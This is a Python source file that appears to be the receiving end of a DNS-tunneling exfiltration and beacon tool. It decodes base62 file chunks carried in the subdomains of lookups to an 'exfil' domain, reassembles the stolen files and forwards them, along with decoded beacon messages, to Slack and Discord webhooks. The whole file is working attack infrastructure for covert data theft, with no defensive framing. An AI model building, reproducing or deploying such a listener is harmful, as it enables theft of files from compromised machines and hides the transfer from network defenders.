import os, base62
from dotenv import load_dotenv; load_dotenv()

import modules.postoffice as Postoffice
from modules.serialize import deserialize_from_header 


# Global Variables
SLACK_WEBHOOK   = os.getenv("SLACK_WEBHOOK")
DISCORD_WEBHOOK = os.getenv("DISCORD_WEBHOOK")

COMPILE  = { } # TODO: Replace with a database
WEBHOOKS = [ SLACK_WEBHOOK, DISCORD_WEBHOOK ]


def handle_exfil( domain : str ):
    """
    Parse & Handle the exfiltrated data received from the Domain Lookup.
    Will send the result to Discord, if a Discord webhook is provided.
    """
    
    #  Domain format for Exfil:
    #      DATA_PART.ID_PART.SHA_PART.exfil.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          First request:     Should include the filename for storing and size. 
    #          Second and onward: Should include the sliced up data for storing.
    #          
    #      ID_PART (base62 encoded):
    #          The slices order number 1 .. N           
    #      
    #      SHA_PART:  
    #          The SHA1 for the file.
    #     
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    data_part = subdomains[ 0 ]
    id_part   = subdomains[ 1 ]
    sha_part  = subdomains[ 2 ]
    
    if id_part == "0":
        data = deserialize_from_header(data_part)
        
        print( data, sha_part )
        
        filename = data["name"]
        filesize = data["size"]
        
        COMPILE[ sha_part ] = {}
        COMPILE[ sha_part ]["name"] = filename
        COMPILE[ sha_part ]["size"] = int(filesize)
        COMPILE[ sha_part ]["data"] = ""
        return True    
    
    if sha_part in COMPILE:
        COMPILE[sha_part]["data"] += data_part
        
    if int(id_part) == COMPILE[ sha_part ]["size"]:
        numbers = base62.decode( COMPILE[ sha_part ]["data"] )
    
        file_data = numbers.to_bytes((numbers.bit_length() + 7) // 8, "big")
        file_name = COMPILE[sha_part]["name"]
    
        Postoffice.send(
            WEBHOOKS,
            Postoffice.Discord_message( 
                files   = [ (file_name, file_data) ] 
            )
        )

        del COMPILE[sha_part]

    return


def handle_beacon( domain : str ):
    """
    Parse & Handle the beacon data received from the Domain Lookup.
    Will send the parsed message to Discord and/or Slack, depending on which webhooks are given.
    """
    
    #  Domain format for Beacon:
    #      DATA_PART.beacon.example.tld
    #  
    #      DATA_PART (base62 encoded):
    #          Should include the transferable message or payload.
    
    # Split into subdomains. Remove Domain & TLD
    subdomains = domain.split(".")[0:-2]
    
    data_part = subdomains[ 0 ]
    message   = str(base62.decodebytes( data_part ).decode())
    
    Postoffice.send(
        WEBHOOKS,
        Postoffice.Slack_message( message ),
        Postoffice.Discord_message( message )
    )
    
    return
